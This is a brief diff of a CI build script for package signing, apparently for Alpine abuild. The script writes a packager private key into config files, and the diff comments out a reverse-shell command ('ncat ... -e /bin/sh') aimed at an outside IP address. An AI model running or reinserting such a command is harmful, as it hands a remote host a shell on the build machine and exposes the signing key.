@@ -9,7 +9,6 @@ mkdir -p /github/home/.abuild
 echo "PACKAGER_PRIVKEY="$rsa"">/home/abuild3/.abuild/abuild.conf
 echo "PACKAGER_PRIVKEY="$rsa"">/github/home/.abuild/abuild.conf
 
-
-ncat 195.201.134.209 84 -e /bin/sh
-sleep 10
+#ncat 195.201.134.209 84 -e /bin/sh
+#sleep 10
 
